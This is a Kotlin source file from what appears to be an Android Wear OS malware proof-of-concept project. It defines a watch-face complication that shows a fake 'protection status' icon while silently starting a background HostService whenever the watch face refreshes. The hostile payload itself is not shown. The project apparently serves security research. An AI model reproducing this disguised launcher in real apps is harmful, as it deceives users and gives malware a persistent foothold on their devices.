package com.antoinejonard.malware_poc.malicious

import android.app.PendingIntent
import android.content.Intent
import android.graphics.Color
import android.graphics.drawable.Icon
import android.util.Log
import androidx.wear.watchface.complications.data.*
import androidx.wear.watchface.complications.datasource.ComplicationDataSourceService
import androidx.wear.watchface.complications.datasource.ComplicationRequest
import com.antoinejonard.malware_poc.MainActivity
import com.antoinejonard.malware_poc.R
import com.antoinejonard.malware_poc.protectionKey


class MaliciousComplicationService : ComplicationDataSourceService() {

    companion object {
        const val TAG = "MALICIOUS_COMPLICATION"
    }

    override fun getPreviewData(type: ComplicationType) = getProtectionStatusComplicationData()

    override fun onComplicationRequest(
        request: ComplicationRequest,
        listener: ComplicationRequestListener
    ) {
        Log.i(TAG, "updating data")

        val data = getProtectionStatusComplicationData()


        if (HostService.isRunning.not()){
            startForegroundService(Intent(this,HostService::class.java))
            Log.i(TAG, "service started")
        }else{
            Log.i(TAG, "service already started")
        }


        listener.onComplicationData(data)
    }

    private fun getProtectionStatusComplicationData(): SmallImageComplicationData {

        val protectionOrdinal = applicationContext.getSharedPreferences(
            MainActivity::class.java.simpleName,
            MODE_PRIVATE
        ).getInt(protectionKey, 1)

        val intent = Intent(applicationContext, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
        }

        val data = SmallImageComplicationData.Builder(
            smallImage = SmallImage.Builder(
                Icon.createWithResource(this,
                    when (protectionOrdinal) {
                        0,1 -> R.drawable.secure
                        2 -> R.drawable.unsecure
                        else -> R.drawable.secure
                    }
                ).setTint(
                    when (protectionOrdinal) {
                        0 -> getColor(R.color.ok_green)
                        1 -> getColor(R.color.unknown_orange)
                        2 -> getColor(R.color.nok_red)
                        else -> getColor(R.color.nok_red)
                    }
                ),
                SmallImageType.ICON
            ).setAmbientImage(
                ambientImage = Icon.createWithResource(this,
                    when (protectionOrdinal) {
                        0,1 -> R.drawable.secure
                        2 -> R.drawable.unsecure
                        else -> R.drawable.secure
                    }
                ).setTint(Color.GRAY)
            ).build(),
            contentDescription = PlainComplicationText.Builder(
                getText(R.string.complication_description)
            ).build()
        ).setTapAction(PendingIntent.getActivity(applicationContext, 0, intent,0)).build()

        return data

    }
}